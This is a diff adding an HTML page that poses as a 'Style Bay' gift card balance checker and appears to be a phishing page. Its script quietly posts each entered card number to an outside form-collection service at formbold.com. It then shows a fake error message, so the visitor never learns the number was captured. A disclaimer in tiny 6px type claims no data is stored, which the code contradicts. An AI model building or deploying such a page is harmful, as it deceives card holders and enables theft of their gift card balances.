@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>gift Balance</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #f7f7f7;
+    }
+p.prea {
+    font-size: 6px;
+}
+    /* Banner Section */
+    .banner {
+        width: 100%;
+        height: 100px;
+        /* background: url('https://images.unsplash.com/photo-1522202176988-66273c2fd55f') */
+        /* center/cover no-repeat; */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: white;
+        font-size: 32px;
+        font-weight: bold;
+        text-shadow: 2px 2px 8px #000;
+    }
+
+    /* Form Section */
+    .container {
+        width: 90%;
+        max-width: 500px;
+        margin: 40px auto;
+        padding: 25px;
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+
+    input, textarea, button {
+        width: 100%;
+        padding: 12px;
+        margin-top: 10px;
+        font-size: 16px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+    }
+
+    button {
+        background: #007bff;
+        color: white;
+        border: none;
+        cursor: pointer;
+        font-size: 18px;
+    }
+
+    button:hover {
+        background: #0056b3;
+    }
+
+    .success {
+        margin-top: 10px;
+        color: rgb(213, 1, 1);
+        font-weight: bold;
+    }
+    .logo {
+            width: 20px;       /* Desktop size */
+            max-width: 100%;    /* Prevent overflow */
+            height: auto;       /* Keeps aspect ratio */
+        }
+        img.banners {
+    width: 100%;
+}
+
+        @media (max-width: 768px) {
+            .logo {
+                width: 20px;   /* Tablet size */
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo {
+                width: 20px;   /* Mobile size */
+            }
+        }
+</style>
+</head>
+
+<body>
+<div style="text-align: left; padding: 20px;">
+        <img src="logo.png" alt="Company Logo" class="logo">
+    </div>
+<!-- Banner Section -->
+<!-- <div class="banner">
+    Enter Your Card Number
+</div> -->
+
+<!-- Form Section -->
+<div class="container">
+    <h2>Enter Card PIN</h2>
+
+    <form id="contactForm" action="https://formbold.com/s/oDR0p" method="POST">
+        Enter Your PIN Number
+        <input type="text" name="Card" placeholder="Enter Card Number" required>
+        <!-- Enter your PIN
+        <input type="text" name="PIN" placeholder="XXXX " required> -->
+        <!-- <input type="email" name="email" placeholder="Enter Email Address" required> -->
+        <!-- <textarea name="message" placeholder="Your Message" rows="4" required></textarea> -->
+
+        <button type="submit">Check Balance</button>
+    </form>
+
+    <p id="successMsg" class="success" style="display:none;">
+        ✔ There was an error checking the balance of your card, Please try after few minutes.
+    </p>
+    
+</div>
+<div style="text-align: left; padding: 20px;">
+        <img src="banner.png" alt="Company Logo" class="banners">
+    </div>
+    <div style="text-align: left; padding: 20px;">
+        <h6>Disclaimer</h6>
+        <p class="prea">Style Bay is currently in testing mode and not yet live or operational.
+We are actively experimenting with different gift card brands and platform functionalities.
+At this stage, we are not accepting any real transactions.<br>
+Please Note: <br>We are not responsible for misuse, loss, or unauthorized use of gift cards.
+All data displayed here is part of a development environment. <br>We do not store, validate, or process actual gift card information.
+Do not submit any real gift card details until the official launch.
+Official Launch: December 2025</p></div>
+    <div style="text-align: left; padding: 20px;">
+        <p class="prea">You can check an  gift card balance by looking at your  A or by using a web browser to visit gift-card/check-balance and entering the PIN</p>
+    </div>
+
+<script>
+document.getElementById("contactForm").addEventListener("submit", function(event){
+    event.preventDefault();
+
+    var form = event.target;
+
+    fetch(form.action, {
+        method: "POST",
+        body: new FormData(form),
+        headers: { "Accept": "application/json" }
+    }).then(() => {
+        document.getElementById("successMsg").style.display = "block";
+        form.reset();
+    });
+});
+</script>
+
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
